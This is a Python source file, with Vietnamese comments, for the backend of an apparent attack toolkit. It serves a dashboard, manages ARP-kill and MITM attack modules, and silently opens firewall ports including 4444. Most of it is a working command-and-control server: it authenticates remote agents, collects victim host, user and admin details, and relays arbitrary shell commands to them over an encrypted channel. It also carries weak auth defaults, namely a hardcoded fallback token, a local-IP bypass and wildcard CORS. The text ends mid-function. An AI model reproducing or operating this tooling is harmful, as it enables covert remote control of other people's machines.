import os
import sys
import time
import json
import socket
import secrets
import threading
import subprocess
import re
import hmac
import hashlib
from http.server import HTTPServer, ThreadingHTTPServer, BaseHTTPRequestHandler
import psutil

# Force UTF-8 Mode
os.environ["PYTHONIOENCODING"] = "utf-8"
os.environ["PYTHONUTF8"] = "1"
if sys.platform == "win32" and hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

if getattr(sys, 'frozen', False):
    BASE_DIR = os.path.dirname(sys.executable)
    BUNDLE_DIR = getattr(sys, '_MEIPASS', BASE_DIR)
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
    BUNDLE_DIR = BASE_DIR

DASHBOARD_DIR = os.path.join(BASE_DIR, "monitoring", "dashboard")
if not os.path.exists(DASHBOARD_DIR):
    DASHBOARD_DIR = os.path.join(BUNDLE_DIR, "monitoring", "dashboard")

PORT = 8080
TERMINAL_STATUSES = {"COMPLETED", "FAILED", "STOPPED", "IDLE"}

# --- TOKEN: sinh theo phiên, lưu ra file để mọi entrypoint dùng chung ---
TOKEN_FILE = os.path.join(BASE_DIR, "monitoring", ".api_token")


def load_or_create_token():
    env_token = os.environ.get("API_AUTH_TOKEN")
    if env_token:
        return env_token
    try:
        os.makedirs(os.path.dirname(TOKEN_FILE), exist_ok=True)
        if os.path.exists(TOKEN_FILE):
            with open(TOKEN_FILE, "r", encoding="utf-8") as f:
                existing = f.read().strip()
                if existing:
                    return existing
        token = secrets.token_urlsafe(24)
        with open(TOKEN_FILE, "w", encoding="utf-8") as f:
            f.write(token)
        return token
    except Exception:
        return "nexus_internal_token"


API_AUTH_TOKEN = load_or_create_token()

# --- STOP FLAGS: dashboard yêu cầu module dừng "mềm" trước khi kill ---
STOP_DIR = os.path.join(BASE_DIR, "monitoring", "stop_flags")


def request_stop(module_key):
    try:
        os.makedirs(STOP_DIR, exist_ok=True)
        with open(os.path.join(STOP_DIR, f"{module_key}.stop"), "w", encoding="utf-8") as f:
            f.write(str(time.time()))
    except Exception:
        pass


def clear_stop(module_key):
    try:
        path = os.path.join(STOP_DIR, f"{module_key}.stop")
        if os.path.exists(path):
            os.remove(path)
    except Exception:
        pass


def get_default_gateway():
    """Đọc gateway mặc định của máy (Windows: ipconfig, fallback socket route)."""
    try:
        if sys.platform == "win32":
            out = subprocess.run(
                ["ipconfig"], capture_output=True, text=True, errors="replace",
                timeout=6, creationflags=subprocess.CREATE_NO_WINDOW,
            ).stdout
            found = re.findall(r"(?:Default Gateway|Gateway)[^\n:]*:\s*([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)", out)
            found = [ip for ip in found if ip and ip != "0.0.0.0"]
            if found:
                return found[0]
            # Fallback: PowerShell route table (khong phu thuoc ngon ngu ipconfig)
            try:
                ps = subprocess.run(
                    ["powershell", "-NoProfile", "-Command",
                     "(Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction Stop | Sort-Object RouteMetric | Select-Object -First 1 -ExpandProperty NextHop)"],
                    capture_output=True, text=True, errors="replace", timeout=8,
                    creationflags=subprocess.CREATE_NO_WINDOW,
                ).stdout.strip()
                if re.fullmatch(r"[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+", ps):
                    return ps
            except Exception:
                pass
        with open("/proc/net/route", "r", encoding="utf-8") as f:
            for line in f.readlines()[1:]:
                fields = line.strip().split()
                if len(fields) > 2 and fields[1] == "00000000":
                    return ".".join(str(int(fields[2][i:i + 2], 16)) for i in (6, 4, 2, 0))
    except Exception:
        pass
    return "Unknown"


GATEWAY_IP = get_default_gateway()

def get_py_runner(script_rel_path, *extra_args):
    import shutil
    target_path = os.path.join(BASE_DIR, script_rel_path)
    if not os.path.exists(target_path):
        target_path = os.path.join(BUNDLE_DIR, script_rel_path)

    # Backend dang chay bang interpreter nao thi dung dung interpreter do.
    # Tranh WindowsApps/py launcher khong co scapy, paramiko, rich...
    if not getattr(sys, "frozen", False):
        return [sys.executable, "-u", target_path] + list(extra_args)

    sys_py = shutil.which("python") or shutil.which("pythonw")
    if sys_py and os.path.exists(target_path):
        return [sys_py, "-u", target_path] + list(extra_args)
    return [sys.executable, "--run-script", target_path] + list(extra_args)

def get_local_ip():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("10.255.255.255", 1))
            return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"

LOCAL_IP = get_local_ip()

# -----------------------------------------------------------------------------
# QUẢN LÝ TIẾN TRÌNH & BỘ NHỚ TRẠNG THÁI (UNIFIED STATE)
# -----------------------------------------------------------------------------
active_processes = {}
process_lock = threading.Lock()

# Job control: mỗi module là một job có id, trạng thái, exit code, metrics riêng
module_jobs = {}
jobs_history = []
jobs_lock = threading.Lock()

JOB_HISTORY_LIMIT = 200
JOB_SEQ = 0

logs_history = []
logs_lock = threading.Lock()

findings_history = []
findings_lock = threading.Lock()

active_module_state = {
    "name": "NEXUS Core",
    "status": "IDLE",
    "target": "None",
    "message": "Waiting for an operation.",
    "metrics": {},
    "started_at": None,
    "updated_at": time.time(),
    "ended_at": None,
}
active_module_lock = threading.Lock()

def add_log(msg, log_type="info", module=None, target=None):
    with logs_lock:
        timestamp = time.strftime("%H:%M:%S")
        entry = {
            "time": timestamp,
            "msg": str(msg or ""),
            "type": str(log_type or "info").lower()
        }
        if module:
            entry["module"] = str(module)
        if target:
            entry["target"] = str(target)
        logs_history.append(entry)
        if len(logs_history) > 2000:
            logs_history.pop(0)


def create_job(module_key, label, target="None", message=""):
    global JOB_SEQ
    with jobs_lock:
        JOB_SEQ += 1
        job_id = f"J{JOB_SEQ:04d}"
        job = {
            "job_id": job_id,
            "module": module_key,
            "label": label,
            "pid": None,
            "status": "STARTING",
            "target": target or "None",
            "message": message,
            "started_at": time.time(),
            "updated_at": time.time(),
            "ended_at": None,
            "exit_code": None,
            "progress": 0,
            "metrics": {},
            "stoppable": True,
        }
        module_jobs[module_key] = job
        return dict(job)


def update_job(module_key, **fields):
    with jobs_lock:
        job = module_jobs.get(module_key)
        if not job:
            return None
        job.update(fields)
        job["updated_at"] = time.time()
        return dict(job)


def finish_job(module_key, exit_code, status=None, message=None):
    global jobs_history
    with jobs_lock:
        job = module_jobs.get(module_key)
        if not job:
            return None
        if status:
            job["status"] = status
        elif job.get("status") not in TERMINAL_STATUSES:
            job["status"] = "COMPLETED" if exit_code == 0 else "FAILED"
        job["exit_code"] = exit_code
        job["ended_at"] = time.time()
        job["updated_at"] = job["ended_at"]
        job["progress"] = 100
        if message:
            job["message"] = message
        snapshot = dict(job)
        jobs_history.append(snapshot)
        if len(jobs_history) > JOB_HISTORY_LIMIT:
            jobs_history.pop(0)
        module_jobs.pop(module_key, None)
        return snapshot


def jobs_snapshot():
    with jobs_lock:
        return [dict(j) for j in module_jobs.values()] + [dict(j) for j in jobs_history[-40:]]


def register_module_job(module_key, label, target="None", message="", pid=None):
    """Tạo job cho module vừa được dashboard khởi chạy và xoá cờ stop cũ."""
    clear_stop(module_key)
    create_job(module_key, label, target=target, message=message)
    return update_job(module_key, pid=pid, status="RUNNING")


GRACEFUL_TIMEOUTS = {"arp_kill": 20.0, "mitm": 20.0}


def stop_process(module_key, proc, timeout=None):
    """Dừng mềm: ghi cờ stop, chờ module tự restore, chỉ kill khi hết thời gian."""
    grace = GRACEFUL_TIMEOUTS.get(module_key, 6.0) if timeout is None else timeout
    update_job(module_key, status="STOPPING", message="Đang yêu cầu dừng và chờ module phục hồi trạng thái mạng...")
    request_stop(module_key)

    if proc.poll() is not None:
        clear_stop(module_key)
        finish_job(module_key, proc.returncode, status="STOPPED")
        return {"module": module_key, "clean": True, "forced": False, "exit_code": proc.returncode}

    # Không gửi CTRL_BREAK: process con được tạo bằng CREATE_NO_WINDOW (không có
    # console/process group riêng), tín hiệu có thể không tới nơi. Cờ stop là
    # kênh duy nhất để module tự thoát và chạy finally.
    forced = False
    try:
        proc.wait(timeout=grace)
    except subprocess.TimeoutExpired:
        forced = True
        try:
            proc.kill()
            proc.wait(timeout=5)
        except Exception:
            pass

    clear_stop(module_key)
    status = "FAILED" if forced else "STOPPED"
    message = "Buộc phải kill sau khi hết thời gian chờ phục hồi." if forced else "Đã dừng sạch sau khi module tự phục hồi."
    finish_job(module_key, proc.returncode, status=status, message=message)
    add_log(f"[{module_key.upper()}] {message}", "warn", module=module_key)
    return {"module": module_key, "clean": not forced, "forced": forced, "exit_code": proc.returncode}


add_log("Unified SOC & C2 Backend khởi động thành công.", "succ")
add_log(f"Địa chỉ IP máy chủ: {LOCAL_IP} | Cổng điều khiển: {PORT} | Gateway: {GATEWAY_IP}", "info")

# Tự động mở rule Firewall cho cổng dashboard và cổng C2 thực tế
def ensure_firewall_rule(name, local_port):
    """Xoá mọi rule trùng tên rồi thêm lại — tránh tích tụ hàng chục rule
    mỗi lần khởi động app / bật C2 listener."""
    try:
        subprocess.run(
            ["powershell", "-NoProfile", "-Command",
             f"Remove-NetFirewallRule -DisplayName '{name}' -ErrorAction SilentlyContinue"],
            capture_output=True, timeout=15,
            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0,
        )
    except Exception:
        pass
    try:
        subprocess.run(
            f'netsh advfirewall firewall add rule name="{name}" dir=in action=allow protocol=TCP localport={local_port}',
            shell=True, capture_output=True, timeout=15,
        )
    except Exception:
        pass


ensure_firewall_rule(f"Security_App_Port_{PORT}", PORT)
ensure_firewall_rule("Security_App_Port_4444", 4444)

# Worker stream output từ subprocess về live log
def stream_process_output(proc, mod_name, module_key=None):
    try:
        for raw_line in iter(proc.stdout.readline, ''):
            if not raw_line:
                break
            line = raw_line.strip()
            if not line:
                continue
            # Xóa mã màu ANSI để hiển thị đẹp
            clean_line = re.sub(r'\x1b\[[0-9;]*[a-zA-Z]', '', line).strip()
            if not clean_line:
                continue
            
            low = clean_line.lower()
            log_type = "info"
            if "[-]" in clean_line or "error" in low or "fail" in low:
                log_type = "err"
            elif "[+]" in clean_line or "thành công" in low or "success" in low or "hoàn tất" in low:
                log_type = "succ"
            elif "[*]" in clean_line or "[!]" in clean_line or "warning" in low:
                log_type = "warn"
            elif "http" in low or "dns" in low or "url" in low or "packet" in low:
                log_type = "cyan"
            add_log(f"[{mod_name.upper()}] {clean_line}", log_type, module=mod_name)
    except Exception:
        pass
    finally:
        try:
            proc.stdout.close()
        except Exception:
            pass
        ret = proc.wait()
        with process_lock:
            for k, p in list(active_processes.items()):
                if p == proc:
                    del active_processes[k]
                    break
        add_log(f"[{mod_name.upper()}] Module đã hoàn tất và kết thúc (Mã: {ret}).", "succ" if ret == 0 else "warn", module=mod_name)
        if module_key:
            finish_job(module_key, ret)
            clear_stop(module_key)

# -----------------------------------------------------------------------------
# ĐO LƯỜNG TỐC ĐỘ MẠNG VÀ PHẦN CỨNG (TELEMETRY WORKER)
# -----------------------------------------------------------------------------
last_net = psutil.net_io_counters()
last_time = time.time()
cached_pps = 0
cached_rx_mb = 0.0
cached_tx_mb = 0.0
cached_rx_bps = 0
cached_tx_bps = 0
cached_packets_recv = 0
cached_packets_sent = 0

def telemetry_worker():
    global last_net, last_time, cached_pps, cached_rx_mb, cached_tx_mb
    global cached_rx_bps, cached_tx_bps, cached_packets_recv, cached_packets_sent
    while True:
        try:
            time.sleep(1.0)
            now = time.time()
            dt = max(now - last_time, 0.001)
            curr = psutil.net_io_counters()
            
            rx_bytes = curr.bytes_recv - last_net.bytes_recv
            tx_bytes = curr.bytes_sent - last_net.bytes_sent
            rx_pkts = curr.packets_recv - last_net.packets_recv
            tx_pkts = curr.packets_sent - last_net.packets_sent
            
            cached_pps = int((rx_pkts + tx_pkts) / dt)
            cached_rx_mb = round((rx_bytes / dt) / (1024 * 1024), 2)
            cached_tx_mb = round((tx_bytes / dt) / (1024 * 1024), 2)
            cached_rx_bps = int(rx_bytes / dt)
            cached_tx_bps = int(tx_bytes / dt)
            cached_packets_recv = curr.packets_recv
            cached_packets_sent = curr.packets_sent
            
            last_net = curr
            last_time = now
        except Exception:
            pass

t_telemetry = threading.Thread(target=telemetry_worker, daemon=True)
t_telemetry.start()

# -----------------------------------------------------------------------------
# C2 MANAGER: Session manager + length-prefix framing + job control
# -----------------------------------------------------------------------------
sys.path.insert(0, os.path.join(BASE_DIR, "attacks"))
import c2_protocol  # noqa: E402
from c2_protocol import (  # noqa: E402
    DEFAULT_SECRET as C2_DEFAULT_SECRET,
    MAX_FRAME as C2_MAX_FRAME,
    decrypt as c2_decrypt,
    derive_key as c2_derive_key,
    encrypt as c2_encrypt,
    handshake_server_after_auth as c2_handshake,
    send_frame as c2_send_frame,
)

C2_EXEC_JOB_LIMIT = 100


class C2Manager:
    def __init__(self, port=4444, secret_key=C2_DEFAULT_SECRET):
        self.port = port
        self.secret_key = secret_key if isinstance(secret_key, bytes) else secret_key.encode("utf-8")
        self.aes_key = c2_derive_key(self.secret_key)
        self.server_sock = None
        self.sessions = {}
        self.selected = None
        self.session_counter = 0
        self.is_running = False
        self.lock = threading.RLock()
        self.exec_jobs = {}
        self.exec_job_order = []
        self.exec_job_seq = 0

    # --- crypto helpers ---
    def encrypt_data(self, data):
        return c2_encrypt(self.aes_key, data)

    def decrypt_data(self, blob):
        return c2_decrypt(self.aes_key, blob)

    # --- listener lifecycle ---
    def start_listener(self):
        with self.lock:
            if self.is_running:
                return True, "C2 Listener đang hoạt động sẵn"
            try:
                # Dual-stack: IPv6 + IPv4-mapped IPv6. Fallback IPv4 neu stack khong ho tro.
                family = socket.AF_INET6
                self.server_sock = socket.socket(family, socket.SOCK_STREAM)
                self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                try:
                    self.server_sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
                except Exception:
                    pass
                try:
                    self.server_sock.bind(("::", self.port))
                except Exception:
                    try:
                        self.server_sock.close()
                    except Exception:
                        pass
                    self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    self.server_sock.bind(("0.0.0.0", self.port))
                self.server_sock.listen(16)
                self.is_running = True
            except Exception as e:
                return False, f"Lỗi bind cổng {self.port}: {e}"

        try:
            ensure_firewall_rule(f"Security_C2_{self.port}", self.port)
        except Exception:
            pass

        threading.Thread(target=self._accept_loop, daemon=True).start()
        add_log(f"[C2] Bắt đầu lắng nghe kết nối Remote Shell tại Port {self.port} (IPv4/IPv6, AES-256-GCM, framing v2).", "succ")
        return True, f"C2 Listener đã mở trên cổng {self.port}"

    def _accept_loop(self):
        while self.is_running:
            try:
                conn, addr = self.server_sock.accept()
            except Exception:
                if not self.is_running:
                    break
                time.sleep(0.2)
                continue
            try:
                peer_ip = str(addr[0])
                if peer_ip.startswith("::ffff:"):
                    peer_ip = peer_ip[7:]
                peer = (peer_ip, addr[1])
                self._handle_connection(conn, peer)
            except Exception:
                try:
                    conn.close()
                except Exception:
                    pass

    def _handle_connection(self, conn, addr):
        challenge = os.urandom(32)
        conn.sendall(challenge)
        conn.settimeout(10.0)
        try:
            response_hash = conn.recv(1024).decode("utf-8", errors="replace")
        except Exception:
            response_hash = ""
        expected_hash = hmac.new(self.secret_key, challenge, hashlib.sha256).hexdigest()
        if response_hash != expected_hash:
            conn.close()
            add_log(f"[C2] Từ chối kết nối từ {addr[0]} (Xác thực HMAC thất bại).", "err")
            return

        conn.sendall(self.encrypt_data(b"AUTH_OK"))
        framing, meta = c2_handshake(conn, self.aes_key, self.secret_key)
        with self.lock:
            self.session_counter += 1
            session_id = f"S{self.session_counter:02d}"
            self.sessions[session_id] = {
                "id": session_id,
                "conn": conn,
                "addr": addr,
                "framing": framing,
                "meta": meta,
                "exec_lock": threading.Lock(),
                "cond": threading.Condition(),
                "results": {},
                "stream": c2_protocol.FrameStream(conn, C2_MAX_FRAME) if framing else None,
                "connected_at": time.time(),
                "last_seen": time.time(),
            }
            self.selected = session_id
        host = meta.get("hostname") if meta else None
        detail = f" | agent: {host} ({meta.get('user')}@{meta.get('os')})" if host else " | agent v1 (không có metadata)"
        add_log(f"[C2] KẾT NỐI THÀNH CÔNG từ {addr[0]}:{addr[1]} — session {session_id}{detail}", "succ")
        if framing:
            conn.settimeout(1.0)
            threading.Thread(target=self._session_reader, args=(session_id,), daemon=True).start()

    def _session_reader(self, session_id):
        """Thread duy nhất đọc socket của session v2.

        Kết quả lệnh được đẩy vào session["results"] và đánh thức thread exec;
        nhờ vậy exec không tranh recv với reader (nguyên nhân lỗi
        'Session đang xử lý một lệnh khác' khi chạy thật).
        """
        with self.lock:
            session = self.sessions.get(session_id)
        if not session:
            return
        stream = session["stream"]
        while True:
            with self.lock:
                if session_id not in self.sessions or not self.is_running:
                    return
            try:
                if not stream.feed():
                    raise ConnectionError("agent đóng kết nối")
                while True:
                    blob = stream.pop_frame()
                    if blob is None:
                        break
                    msg = json.loads(self.decrypt_data(blob).decode("utf-8", errors="replace"))
                    if not isinstance(msg, dict):
                        continue
                    with self.lock:
                        if session_id not in self.sessions:
                            return
                        self.sessions[session_id]["last_seen"] = time.time()
                    if msg.get("type") == "event":
                        add_log(f"[C2-{session_id}] {msg.get('message')}", "warn", module="C2")
                    elif msg.get("type") == "result":
                        with session["cond"]:
                            session["results"][msg.get("id")] = msg
                            session["cond"].notify_all()
            except socket.timeout:
                with self.lock:
                    if session_id in self.sessions:
                        self.sessions[session_id]["last_seen"] = time.time()
                continue
            except Exception:
                self._drop_session(session_id, reason=f"session {session_id} kết thúc")
                return

    def _drop_session(self, session_id, reason=None):
        with self.lock:
            session = self.sessions.pop(session_id, None)
            if self.selected == session_id:
                self.selected = next(iter(self.sessions), None)
        if session:
            with session["cond"]:
                session["cond"].notify_all()
            try:
                session["conn"].close()
            except Exception:
                pass
            if reason:
                add_log(f"[C2] {reason}.", "warn", module="C2")

    def list_sessions(self):
        with self.lock:
            out = []
            for sid, session in self.sessions.items():
                meta = session.get("meta") or {}
                out.append({
                    "id": sid,
                    "client_ip": session["addr"][0],
                    "client_port": session["addr"][1],
                    "connected_at": session["connected_at"],
                    "last_seen": session["last_seen"],
                    "selected": sid == self.selected,
                    "proto": "v2" if session["framing"] else "v1",
                    "hostname": meta.get("hostname"),
                    "user": meta.get("user"),
                    "os": meta.get("os"),
                    "arch": meta.get("arch"),
                    "admin": meta.get("admin"),
                    "pid": meta.get("pid"),
                    "agent_version": meta.get("version"),
                })
            return out

    def select_session(self, session_id):
        with self.lock:
            if session_id not in self.sessions:
                return False, f"Không tìm thấy session {session_id}"
            self.selected = session_id
        return True, f"Đã chọn session {session_id}"

    def close_session(self, session_id=None):
        with self.lock:
            sid = session_id or self.selected
        if not sid or sid not in self.sessions:
            return False, "Không có session nào để đóng"
        self._drop_session(sid, reason=f"đã đóng session {sid} theo yêu cầu")
        return True, f"Đã đóng session {sid}"

    def _get_session(self, session_id=None):
        with self.lock:
            sid = session_id or self.selected
            if sid and sid in self.sessions:
                return self.sessions[sid]
            if self.sessions:
                return list(self.sessions.values())[-1]
        return None

    # --- command execution ---
    def execute_command(self, command, session_id=None, timeout=70.0):
        session = self._get_session(session_id)
        if not session:
            return False, "Chưa có thiết bị nào kết nối về C2! Đảm bảo agent đang chạy trên máy mục tiêu.", None
        if not session["exec_lock"].acquire(timeout=10.0):
            return False, "Session đang xử lý một lệnh khác, vui lòng đợi.", None

        conn = session["conn"]
        try:
            if session["framing"]:
                job_id = f"e{int(time.time() * 1000)}"
                payload = json.dumps(
                    {"type": "exec", "id": job_id, "command": command, "timeout": int(max(5, timeout - 5))},
                    ensure_ascii=False,
                ).encode("utf-8")
                try:
                    c2_send_frame(conn, self.encrypt_data(payload))
                except Exception as e:
                    self._drop_session(session["id"], reason=f"agent {session['addr'][0]} ngắt kết nối")
                    return False, f"Không gửi được lệnh: {e}", None

                deadline = time.time() + timeout
                result = None
                with session["cond"]:
                    while time.time() < deadline:
                        result = session["results"].pop(job_id, None)
                        if result is not None:
                            break
                        if session["id"] not in self.sessions:
                            return False, "Mục tiêu đã ngắt kết nối.", None
                        session["cond"].wait(timeout=min(1.0, max(0.05, deadline - time.time())))
                if result is None:
                    return False, f"Hết thời gian chờ phản hồi ({int(timeout)}s). Có thể huỷ và thử lại.", None

                stdout = result.get("stdout") or ""
                stderr = result.get("stderr") or ""
                text = stdout
                if stderr:
                    text += ("\n--- stderr ---\n" if stdout else "") + stderr
                if not text.strip():
                    text = "[+] Lệnh thực thi thành công, không có output."
                add_log(f"[C2-EXEC] {command} -> exit={result.get('exit_code')} ({len(text)} bytes)", "cyan", module="C2")
                return True, text, result.get("exit_code")

            # Legacy agent (protocol v1): ciphertext thô, không length prefix
            conn.settimeout(timeout)
            conn.sendall(self.encrypt_data(command.encode("utf-8")))
            enc_result = conn.recv(C2_MAX_FRAME)
            if not enc_result:
                self._drop_session(session["id"], reason=f"agent {session['addr'][0]} ngắt kết nối")
                return False, "Mục tiêu đã ngắt kết nối.", None
            output = self.decrypt_data(enc_result).decode("utf-8", errors="replace")
            add_log(f"[C2-EXEC] {command} -> Hoàn tất ({len(output)} bytes)", "cyan", module="C2")
            return True, output, None
        except socket.timeout:
            return False, f"Hết thời gian chờ phản hồi ({int(timeout)}s).", None
        except Exception as e:
            return False, f"Lỗi gửi lệnh: {e}", None
        finally:
            try:
                session["exec_lock"].release()
            except Exception:
                pass

    def start_exec_job(self, command, session_id=None, timeout=70.0):
        with self.lock:
            self.exec_job_seq += 1
            job_id = f"c2{self.exec_job_seq:05d}"
            self.exec_jobs[job_id] = {
                "job_id": job_id,
                "command": command,
                "session_id": session_id or self.selected,
                "status": "RUNNING",
                "output": "",
                "exit_code": None,
                "error": None,
                "started_at": time.time(),
                "ended_at": None,
            }
            self.exec_job_order.append(job_id)
            while len(self.exec_job_order) > C2_EXEC_JOB_LIMIT:
                stale = self.exec_job_order.pop(0)
                self.exec_jobs.pop(stale, None)

        def worker():
            ok, output, exit_code = self.execute_command(command, session_id=session_id, timeout=timeout)
            with self.lock:
                job = self.exec_jobs.get(job_id)
                if job:
                    job["status"] = "COMPLETED" if ok else "FAILED"
                    job["output"] = output
                    job["exit_code"] = exit_code
                    job["error"] = None if ok else output
                    job["ended_at"] = time.time()

        threading.Thread(target=worker, daemon=True).start()
        return job_id

    def get_exec_job(self, job_id):
        with self.lock:
            job = self.exec_jobs.get(job_id)
            return dict(job) if job else None

    def stop_listener(self):
        with self.lock:
            self.is_running = False
            session_ids = list(self.sessions.keys())
        for sid in session_ids:
            self._drop_session(sid, reason=f"listener dừng, đóng session {sid}")
        with self.lock:
            if self.server_sock:
                try:
                    self.server_sock.close()
                except Exception:
                    pass
                self.server_sock = None
        add_log(f"[C2] Đã dừng C2 Listener Port {self.port}.", "warn")
        return True, "Đã dừng C2 Listener"

    def get_status(self):
        sessions = self.list_sessions()
        active = next((s for s in sessions if s["id"] == self.selected), sessions[-1] if sessions else None)
        with self.lock:
            listening = self.is_running
        return {
            "listening": listening,
            "port": self.port,
            "connected": bool(sessions),
            "client_ip": active["client_ip"] if active else None,
            "client_port": active["client_port"] if active else None,
            "active_session": self.selected,
            "session_count": len(sessions),
            "sessions": sessions,
        }


c2_manager = C2Manager()

# -----------------------------------------------------------------------------
# HTTP REQUEST HANDLER (UNIFIED BACKEND)
# -----------------------------------------------------------------------------
class AppHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return

    def end_cors(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type, X-API-Token")

    def _send_json(self, status, payload):
        body = json.dumps(payload, ensure_ascii=False).encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
        self.end_cors()
        self.end_headers()
        self.wfile.write(body)

    def _is_local_client(self):
        client_ip = self.client_address[0]
        return client_ip in {"127.0.0.1", "::1", "localhost", LOCAL_IP}

    def _check_auth(self):
        # Cho phép localhost hoặc có X-API-Token hợp lệ
        if self._is_local_client():
            return True
        client_token = self.headers.get("X-API-Token", "")
        return client_token == API_AUTH_TOKEN

    def do_OPTIONS(self):
        self.send_response(200)
        self.end_cors()
        self.end_headers()

    def do_GET(self):
        req_path = self.path.split("?")[0]
        query = {}
        if "?" in self.path:
            from urllib.parse import parse_qs

            query = {k: v[0] for k, v in parse_qs(self.path.split("?", 1)[1]).items()}

        # Các endpoint trạng thái nhạy cảm đều yêu cầu token (localhost vẫn được bypass)
        if req_path in {"/api/topology", "/api/logs", "/api/findings", "/api/c2/status",
                        "/api/jobs", "/api/c2/job", "/api/system"}:
            if not self._check_auth():
                self._send_json(401, {"ok": False, "error": "Unauthorized: Invalid API Token"})
                return
        
        # 1. API: Telemetry (Schema kết hợp cả phẳng và lồng để tương thích 100%)
        if req_path == "/api/telemetry":
            cpu = psutil.cpu_percent(interval=None)
            mem = psutil.virtual_memory().percent
            
            running_mods = []
            with process_lock:
                for k, p in active_processes.items():
                    if p.poll() is None:
                        running_mods.append(k)

            with active_module_lock:
                act_mod = dict(active_module_state)

            with findings_lock:
                findings_snap = list(findings_history)

            with logs_lock:
                logs_snap = list(logs_history[-100:])
            topo_path = os.path.join(BASE_DIR, "monitoring", "topology.json")
            topology_data = {"nodes": [], "links": [], "subnet": "Unknown"}
            if os.path.exists(topo_path):
                try:
                    with open(topo_path, "r", encoding="utf-8") as tf:
                        td = json.load(tf)
                        if isinstance(td, dict):
                            topology_data = td
                except Exception:
                    pass

            # HYBRID SCHEMA:
            # - Flat: phục vụ app.js
            # - Nested: phục vụ attack.py, reporter.py, dashboard.js
            data = {
                # Flat properties (app.js)
                "cpu": cpu,
                "ram": mem,
                "pps": cached_pps,
                "rx_mb": cached_rx_mb,
                "tx_mb": cached_tx_mb,
                "local_ip": LOCAL_IP,
                "gateway_ip": GATEWAY_IP,
                "active_modules": running_mods,
                "jobs": jobs_snapshot(),
                "c2_connected": c2_manager.get_status()["connected"],
                "timestamp": time.strftime("%H:%M:%S"),

                # Nested properties (serve_dashboard.py / attack.py)
                "system": {
                    "cpu_percent": cpu,
                    "mem_percent": mem,
                    "active_nic": "Wi-Fi" if sys.platform == "win32" else "eth0",
                    "local_ip": LOCAL_IP,
                    "gateway_ip": GATEWAY_IP,
                    "timestamp": time.time(),
                },
                "network": {
                    "rx_bps": cached_rx_bps,
                    "tx_bps": cached_tx_bps,
                    "rx_pps": cached_pps,
                    "packets_recv": cached_packets_recv,
                    "packets_sent": cached_packets_sent,
                },
                "active_module": act_mod,
                "topology": topology_data,
                "devices": topology_data.get("nodes", []),
                "findings": findings_snap,
                "logs": logs_snap,
            }
            self._send_json(200, data)
            return

        # 2. API: Topology
        if req_path == "/api/topology":
            topo_path = os.path.join(BASE_DIR, "monitoring", "topology.json")
            topology_data = {"nodes": [], "links": []}
            if os.path.exists(topo_path):
                try:
                    with open(topo_path, "r", encoding="utf-8") as f:
                        topology_data = json.load(f)
                except Exception:
                    pass
            self._send_json(200, topology_data)
            return

        # 3. API: C2 Status
        if req_path == "/api/c2/status":
            self._send_json(200, c2_manager.get_status())
            return

        # 4. API: Logs
        if req_path == "/api/logs":
            with logs_lock:
                logs_snap = list(logs_history)
            self._send_json(200, logs_snap)
            return

        # 5. API: Findings
        if req_path == "/api/findings":
            with findings_lock:
                findings_snap = list(findings_history)
            self._send_json(200, findings_snap)
            return

        # 5b. API: Jobs (module + C2 job control)
        if req_path == "/api/jobs":
            self._send_json(200, {"jobs": jobs_snapshot(), "c2_jobs": list(c2_manager.exec_jobs.values())})
            return

        # 5c. API: C2 exec job (poll kết quả theo job id thay vì treo HTTP)
        if req_path == "/api/c2/job":
            job = c2_manager.get_exec_job(query.get("id", ""))
            if not job:
                self._send_json(404, {"ok": False, "error": "Không tìm thấy job"})
            else:
                self._send_json(200, job)
            return

        # 5d. API: system info
        if req_path == "/api/system":
            self._send_json(200, {
                "local_ip": LOCAL_IP,
                "gateway_ip": GATEWAY_IP,
                "port": PORT,
                "c2_port": c2_manager.port,
                "platform": f"{sys.platform}",
                "python": sys.version.split()[0],
                "cwd": BASE_DIR,
            })
            return

        # 6. Phục vụ file Static (Dashboard HTML/CSS/JS) - VÁ PATH TRAVERSAL
        if req_path == "/" or req_path == "":
            req_path = "/index.html"
            
        norm_path = os.path.normpath(req_path.lstrip("/\\"))
        file_path = os.path.abspath(os.path.join(DASHBOARD_DIR, norm_path))
        dash_abs = os.path.abspath(DASHBOARD_DIR)

        # Chặn đứng Path Traversal nếu cố tình đọc ra ngoài thư mục static
        if not (file_path == dash_abs or file_path.startswith(dash_abs + os.sep)):
            self.send_response(403)
            self.end_headers()
            return

        if os.path.exists(file_path) and os.path.isfile(file_path):
            content_type = "text/plain"
            if file_path.endswith(".html"): content_type = "text/html; charset=utf-8"
            elif file_path.endswith(".css"): content_type = "text/css"
            elif file_path.endswith(".js"): content_type = "application/javascript"
            elif file_path.endswith(".json"): content_type = "application/json"
            elif file_path.endswith(".svg"): content_type = "image/svg+xml"
            elif file_path.endswith(".png"): content_type = "image/png"
            elif file_path.endswith(".ico"): content_type = "image/x-icon"

            self.send_response(200)
            self.send_header("Content-Type", content_type)
            self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
            self.end_cors()
            self.end_headers()
            if file_path.endswith((".html", ".js")):
                # Inject token phiên vào dashboard thay vì hardcode trong static file
                with open(file_path, "r", encoding="utf-8", errors="replace") as f:
                    text = f.read()
                text = text.replace("{{API_TOKEN}}", API_AUTH_TOKEN)
